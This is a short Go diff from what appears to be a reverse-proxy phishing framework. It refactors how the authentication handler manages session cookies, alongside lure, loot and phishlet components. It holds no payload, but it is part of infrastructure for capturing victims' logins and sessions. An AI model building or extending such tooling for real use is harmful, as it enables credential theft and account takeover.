@@ -88,8 +88,7 @@ func setupProxyHandler(conf *appConfig, conv DomainConverter,
 func setupAuthHandler(conf *appConfig, conv DomainConverter, lureService LureService,
 	lootService *lootService) fiber.Handler {
 
-	cookieManager := NewCookieManager()
-	storage := NewSessionStorage(memory.New(), cookieManager, lootService)
+	storage := NewSessionStorage(memory.New(), lootService)
 	store := session.New(session.Config{
 		Expiration:     conf.SessionExpiration,
 		KeyLookup:      "cookie:" + conf.SessionCookieName,
@@ -98,10 +97,10 @@ func setupAuthHandler(conf *appConfig, conv DomainConverter, lureService LureSer
 		CookieHTTPOnly: true,
 		Storage:        storage,
 	})
+	sm := NewSessionManager(store, conf.SessionCookieName)
+	storage.AddSessionDeleter(sm)
 	authConf := AuthConfig{
-		CookieName:     conf.SessionCookieName,
-		CookieManager:  cookieManager,
-		Store:          store,
+		SessionManager: sm,
 		InvalidAuthURL: conf.Phishlet.InvalidAuthURL,
 		LoginURL:       conv.ToProxyURL(conf.Phishlet.LoginURL),
 		LureService:    lureService,
